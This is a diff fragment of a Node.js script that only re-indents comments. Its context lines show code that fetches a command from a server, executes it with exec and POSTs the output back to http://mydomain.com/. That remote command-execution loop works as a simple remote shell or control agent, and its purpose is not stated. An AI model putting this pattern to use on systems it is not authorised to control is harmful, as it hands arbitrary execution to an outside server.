@@ -19,17 +19,17 @@ http.get(httpOptions, function(response) {
 	
 	response.on("end", function() {
 		var parsed = JSON.parse(body);
-    // store the command in a variable
+		// store the command in a variable
 		var command = parsed.command;
 		
-    // execute the command
+		// execute the command
 		child = exec(command,
 		  function (error, stdout, stderr) {
 			
-      // log out the response from executing the command
+			// log out the response from executing the command
 			console.log(stdout);
 			
-      // post the results of the command execution back to the server
+			// post the results of the command execution back to the server
 			request({
 				url: "http://mydomain.com/",
 				method: "POST",
@@ -40,12 +40,12 @@ http.get(httpOptions, function(response) {
 				if(error) {
 					console.log(error);
 				} else {
-          // log the success message received from the server
+					// log the success message received from the server
 					console.log(response.statusCode, body);
 				}
 			});
 			
-      // error handling for exec()
+			// error handling for exec()
 			if (error !== null) {
 			  console.log("exec error: " + error);
 			}
